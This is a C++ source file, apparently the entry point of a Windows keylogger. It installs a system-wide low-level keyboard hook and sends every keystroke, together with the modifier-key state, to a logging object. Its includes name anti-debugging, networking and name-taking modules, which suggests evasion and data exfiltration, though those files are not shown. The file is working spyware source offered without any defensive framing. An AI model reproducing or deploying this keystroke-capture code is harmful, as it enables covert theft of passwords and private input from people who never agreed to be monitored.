#include "common.h"
#include "keylogger.h"
#include "keylogger_antidebugg.h"
#include "kqnet.h"
#include "nameTaker.h"
#include <Windows.h>
#include <iostream>

keylogger transKeys;

uint16_t modifierMask() {
    uint16_t controlState = (GetKeyState(VK_CONTROL) & 0x8000) ? 1 : 0;
    uint16_t shiftState = (GetKeyState(VK_SHIFT) & 0x8000) ? 1 : 0;
    uint16_t capsState = GetKeyState(VK_CAPITAL) & 1;
    uint16_t winState =
        (GetKeyState(VK_LWIN) & 0x8000 | GetKeyState(VK_RWIN) & 0x8000) ? 1 : 0;

    uint16_t modifierKeysBitMask = 0;
    modifierKeysBitMask |= controlState << 0;
    modifierKeysBitMask |= shiftState << 1;
    modifierKeysBitMask |= capsState << 2;
    modifierKeysBitMask |= winState << 3;

    return modifierKeysBitMask;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        keyStatus status = keyStatus::keyUp;
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            status = keyStatus::keyDown;
        } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
        }
        uint16_t modifierKeysBitMask = modifierMask();
        transKeys.handleKeyStroke(p->vkCode, status, modifierKeysBitMask);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK keyboardHook =
        SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (keyboardHook == NULL) {
        std::cout << "Failed to install keyboard hook!" << std::endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);

    return 0;
}